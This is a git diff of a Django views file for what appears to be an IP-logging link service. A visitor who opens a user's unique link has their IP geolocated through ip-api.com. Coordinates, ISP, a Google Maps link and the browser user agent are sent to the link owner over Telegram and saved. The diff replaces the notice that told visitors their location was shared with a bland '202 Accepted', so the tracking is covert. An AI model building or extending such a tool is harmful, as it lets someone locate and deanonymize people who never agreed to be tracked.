@@ -1,6 +1,3 @@
-
-
-
 import json
 import os
 from sqlite3 import IntegrityError
@@ -8,10 +5,6 @@ import requests
 from django.http import HttpResponse
 from django.shortcuts import redirect
 import secrets
-from django.db import transaction
-import random
-import string
-import calendar
 from django.shortcuts import render
 from .forms import UserCreateForm
 from django.contrib.auth.models import User
@@ -31,7 +24,6 @@ def contact(request):
 
 def home(request):
     return render(request,'home.html')
-
 
 def login_view(request):
     if request.method == 'GET':
@@ -58,13 +50,13 @@ def generate_link(sender, instance, **kwargs):
 
     token = instance.token
     slug = slugify(token)
-    link = f"http://{server_address}/location/{slug}"
+    link = f"{server_address}/location/{slug}"
     instance.link = link
 
 
 
 
-def register(request):  # sourcery skip: extract-method
+def register(request):  
     if request.method == "GET":
         return render(request, "registration/register.html", {"form": UserCreateForm})
 
@@ -86,7 +78,7 @@ def register(request):  # sourcery skip: extract-method
         )
 
     try:
-        # Create a new User object using the form data
+        # Create a new user using the provided username and password
         author = User.objects.create_user(
             request.POST["username"], 
             password=request.POST["password1"]
@@ -104,7 +96,7 @@ def register(request):  # sourcery skip: extract-method
     
         # Create a new TokenSummary object using the form data
         token_summary = TokenSummary.objects.create(
-            author=author, token=token, token_count=1
+            author=author, token=token
         )
 
         # Generate the unique link for the user using the generate_link function
@@ -132,33 +124,28 @@ def register(request):  # sourcery skip: extract-method
 
 @login_required
 def user_track(request):
-    # Get the track record for the authenticated user, or create a new one if it doesn't exist
-    #track, created = VisitCount.objects.get_or_create(author=request.user)
-    userdata = UserLocation.objects.all()
-    
+    # Get the visit count, today's total, monthly total, and yearly total for the authenticated user
+    visit_count = VisitCount.objects.get(author=request.user).visit_count
+    today_total = VisitCount.objects.get(author=request.user).today_total
+    monthly_total = VisitCount.objects.get(author=request.user).monthly_total
+    yearly_total = VisitCount.objects.get(author=request.user).yearly_total
 
+    # data is display to deseding order
+    userdata = UserLocation.objects.order_by('-date', '-time')
+    
 
     if request.user.is_authenticated:
         # If the user is authenticated, render the 'user_track.html.' template
-        return render(request, 'user_track.html', {'userdata':userdata})
+        return render(request, 'user_track.html', {'userdata':userdata, 'visit_count': visit_count, 'today_total': today_total, 'monthly_total': monthly_total, 'yearly_total': yearly_total})
     else:
         # If the user is not authenticated, redirect to the home page
         return redirect('home')
 
-
-
-from datetime import datetime
-def send_location(request, token):  # sourcery skip: low-code-quality
-    # Get the current URL
+def send_location(request, token): 
 
     # Get the user agent of the browser
     user_agent = request.META['HTTP_USER_AGENT']
 
-
-    # Check if the request method is POST
-    if request.method == "POST":
-        # If the request method is POST, get the current URL from the form data
-        current_url = request.POST["current_url"]
 
     # Check if the provided token exists in the database
     if not TokenSummary.objects.filter(token=token).exists():
@@ -169,37 +156,30 @@ def send_location(request, token):  # sourcery skip: low-code-quality
     # chat id is used to sent message to login user
     chat_id = token_summary.chat_id 
 
-    # Get the user associated with the token 
-    # this author is used to get the user's track record
+    # Get the user associated with the token .this author is used to get the user's track record
     author = token_summary.author
 
-    current_url = token_summary.link
-
-    # Get the current date
-    today = date.today()
-    
-    # Get the current time
-    current_time = datetime.now()
-
-  #  current_time_str = datetime.now()
- #   current_time = current_time_str.strftime('%Y-%m-%d %H:%M:%S')
-
-
-    print(current_time)
     # Create a new Visit object using the create_visit function
     create_visit(author)
 
+    # Get the user's visit count, today's total, monthly total, and yearly total
+    visit_count = VisitCount.objects.get(author=author).visit_count
+    today_total = VisitCount.objects.get(author=author).today_total
+    monthly_total = VisitCount.objects.get(author=author).monthly_total
+    yearly_total = VisitCount.objects.get(author=author).yearly_total
+    
 
+    
+    # Get the user's IP address
+    ip = request.META.get('HTTP_X_FORWARDED_FOR', request.META['REMOTE_ADDR'])
+    if ip is not None:
+        # If the user is accessing the website through a proxy, get the first IP address in the list
+        ip = ip.split(",")[0]
 
     # Use the 'ip-api.com' API to get the user's location
     # Note: The fields parameter specifies which fields to include in the response
-    ip_url = f"http://ip-api.com/json/{request.META['REMOTE_ADDR']}?fields=continent,country,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,asname,mobile,proxy,hosting,query"
+    ip_url = f"http://ip-api.com/json/{ip}?fields=continent,country,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,asname,mobile,proxy,hosting,query"
     ip_response = requests.get(ip_url)   
-
-
-    # Print the response headers to check the remaing limit
-    
-    #print(ip_response.headers)
 
 
     # Parse the response and extract the user's location
@@ -245,12 +225,12 @@ def send_location(request, token):  # sourcery skip: low-code-quality
 
     # Construct the message to be sent to the recipient
     message = ""
-    if "ip" in ip_data:
-        message += "IP Address: " + ip_data["ip"] + "\n"
+    if "query" in ip_data:
+        message += "IP Address: " + ip_data["query"] + "\n"
     if "lat" in ip_data:
-        message += "Latitude: " + ip_data["lat"] + "\n"
+        message += "Latitude: " + str(ip_data["lat"]) + "\n"
     if "lon" in ip_data:
-        message += "Longitude: " + ip_data["lon"] + "\n"
+        message += "Longitude: " + str(ip_data["lon"]) + "\n"
     if "continent" in ip_data:
         message += "Continent: " + ip_data["continent"] + "\n"
     if "country" in ip_data:
@@ -281,21 +261,28 @@ def send_location(request, token):  # sourcery skip: low-code-quality
         message += "Proxy: " + ip_data["proxy"] + "\n"
     if "hosting" in ip_data:
         message += "Hosting: " + ip_data["hosting"] + "\n"
-    if "query" in ip_data:
-        message += "IP Address: " + ip_data["query"] + "\n\n"
-
 
     # Include the Google Maps URL in the message
     if "lat" in ip_data and "lon" in ip_data:
         lat = ip_data["lat"]
         lon = ip_data["lon"]
         message += "Google Maps URL: " + f"https://www.google.com/maps/@{lat},{lon}" + "\n"
+
+    # Get the current time
+    current_time = datetime.now()
     message += "User Agent: " + user_agent + "\n"
     message += "Time: " + current_time.strftime("%I:%M %p") + "\n"
     message += "Date: " + current_time.strftime("%d/%m/%Y") + "\n"
 
+    # Send the message to the  user's visit count, today's total, monthly total, and yearly total
+    message += "Visits Today: " + str(today_total) + "\n"
+    message += "Visits This Month: " + str(monthly_total) + "\n"
+    message += "Visits This Year: " + str(yearly_total) + "\n"
+    message += "Total Visits: " + str(visit_count) + "\n"
 
-# Use the get method to retrieve the values from the ip_data dictionary, and specify a default value if the key is not present
+
+    # Use the get method to retrieve the values from the ip_data dictionary, and specify a default value if the key is not present 
+    ip_address = ip_data.get("query", "")
     latitude = ip_data.get("lat", 0)
     longitude = ip_data.get("lon", 0)
     continent = ip_data.get("continent", "")
@@ -313,8 +300,6 @@ def send_location(request, token):  # sourcery skip: low-code-quality
     mobile = ip_data.get("mobile", "")
     proxy = ip_data.get("proxy", "")
     hosting = ip_data.get("hosting", "")
-    ip_address = ip_data.get("query", "")
-    
     if "lat" in ip_data and "lon" in ip_data:
         lat = ip_data["lat"]
         lon = ip_data["lon"]
@@ -323,11 +308,8 @@ def send_location(request, token):  # sourcery skip: low-code-quality
         map_link = ""
         user_agent = request.headers.get("User-Agent")
 
-    
-
     user_location = UserLocation(
         author=author,
-        #token=token,
         latitude=latitude,
         longitude=longitude,
         continent=continent,
@@ -347,9 +329,7 @@ def send_location(request, token):  # sourcery skip: low-code-quality
         hosting=hosting,
         ip_address=ip_address,
         map_link=map_link,
-        user_agent=user_agent,
-
-        
+        user_agent=user_agent,    
     )
     # Save the UserLocation object to the database
     user_location.save(request)
@@ -360,12 +340,8 @@ def send_location(request, token):  # sourcery skip: low-code-quality
     send_message_data = {"chat_id": chat_id, "text": message}
     send_message_response = requests.post(send_message_url, data=send_message_data)
 
-# Call the save_user_location function to save the user's location information
-    
-
-
     # Return a message to the user indicating that their location has been successfully sent
-    return HttpResponse("Your location has been sent to the recipient!")
+    return HttpResponse("202 Accepted")
 
 
 
@@ -418,77 +394,46 @@ def token_summary(request):
 
 
 
-#########################################################################################################
-
-
-
-
-
 def create_visit(author):
-    # sourcery skip: hoist-similar-statement-from-if, hoist-statement-from-if
+    # Get the current date and time
+    current_date = datetime.now().date()
+
     # Get the track record for the authenticated user, or create a new one if it doesn't exist
     visit, created = VisitCount.objects.get_or_create(
         author=author,
-        today=date.today(),
+        today=current_date,
     )
 
-    # Get the current date and time
-    current_date = datetime.now().date()
-    print('---------------------')
-    print(visit.visit_count)
-    #increse the total visit count
+    # Increment the total visit count
     visit.visit_count += 1
-    print(visit.visit_count)
-    print('---------------------')
 
-    print(visit.last_visit_date)
-    print(current_date)
+    # Check if the day has changed since the last visit
+    if visit.last_visit_date.day != current_date.day:
+        # If the day has changed, reset the daily visit count
+        visit.today_total = 0
+    # Increment the daily visit count
+    visit.today_total += 1
 
-    # Check if the last visit was on the same day as the current visit
-    if visit.last_visit_date == current_date:
-        
-        # If the last visit was on the same day, increment the daily visit count
-        print('--------- total count ------------')
-        print(visit.today_total)
-        visit.today_total += 1
-        print(visit.today_total)
-        print('---------------------')
+    # Check if the month has changed since the last visit
+    if visit.last_visit_date.month != current_date.month:
+        # If the month has changed, reset the monthly visit count
+        visit.monthly_total = 0
+    # Increment the monthly visit count
+    visit.monthly_total += 1
 
-    else:
-        # If the last visit was not on the same day, reset the daily visit count
-        print('-------- today total count -------------')
-        print(visit.today_total)
-        visit.today_total = 1
-        print(visit.today_total)
-        print('---------------------')
-        
-
-    # Check if the last visit was in the same month as the current visit
-    if visit.last_visit_date.month == current_date.month:
-        # If the last visit was in the same month, increment the monthly visit count
-        print('--------  if conditon monthly total count -------------')
-        print(visit.monthly_total)
-        visit.monthly_total += 1
-        print(visit.monthly_total)
-        print('---------------------')
-    else:
-        # If the last visit was not in the same month, reset the monthly visit count
-        print('--------  else conditon monthly total count -------------')
-        print(visit.monthly_total)
-        visit.monthly_total = 1
-        print(visit.monthly_total)
-        print('---------------------')
-
-    # Check if the last visit was in the same year as the current visit
-    if visit.last_visit_date.year == current_date.year:
-        # If the last visit was in the same year, increment the yearly visit count
-        visit.yearly_total += 1
-    else:
-        # If the last visit was not in the same year, reset the yearly visit count
-        visit.yearly_total = 1
+    # Check if the year has changed since the last visit
+    if visit.last_visit_date.year != current_date.year:
+        # If the year has changed, reset the yearly visit count
+        visit.yearly_total = 0
+    # Increment the yearly visit count
+    visit.yearly_total += 1
 
     # Update the last visit date
     visit.last_visit_date = current_date
 
     # Save the updated visit count to the database
     visit.save()
+
+
+#############################################################################################################
+
